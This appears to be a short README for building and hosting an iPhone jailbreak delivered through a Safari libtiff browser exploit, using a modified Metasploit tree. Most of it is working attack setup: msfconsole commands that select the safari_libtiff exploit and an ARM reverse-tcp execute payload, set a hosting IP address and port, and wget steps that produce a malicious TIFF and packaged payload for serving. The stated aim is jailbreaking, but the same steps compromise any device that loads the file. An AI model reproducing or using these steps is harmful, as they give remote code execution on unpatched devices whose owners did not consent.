These are files that have been modified or added to the main Metasplot framework3 tree. Metasploit requires Ruby to be installed.

Do svn co http://metasploit.com/svn/framework3/trunk/, then merge these two trees.

data/ipwn/Payload is the compiled payload.

data/reverse/query ought to be modified depending on the server used to host the jailbreak files.

The script used to generate the appropriate jailbreak files (not including the resources) are as follows:

In ./msfconsole:

use exploit/osx/browser/safari_libtiff
set URIPATH /ipwn
set PAYLOAD osx/armle/execute/reverse_tcp
set MHOST 74.125.19.147
set MPORT 80
set QUERY data/reverse_tcp/query
set PEXEC data/ipwn/Payload
set LHOST <your local IP; does not really matter in this case>
exploit

In a Linux shell:

wget http://localhost:8080/ipwn -O exploit.tiff
wget http://localhost:4444/ -O payload.bin

exploit.tiff is the resulting exploit tiff and payload.bin is the packaged Payload. The names are insignificant except that payload.bin is referenced in data/reverse_tcp/query.

The instructions I gave are the same as the ones I used to set things up for hosting the exploit on Google Code.
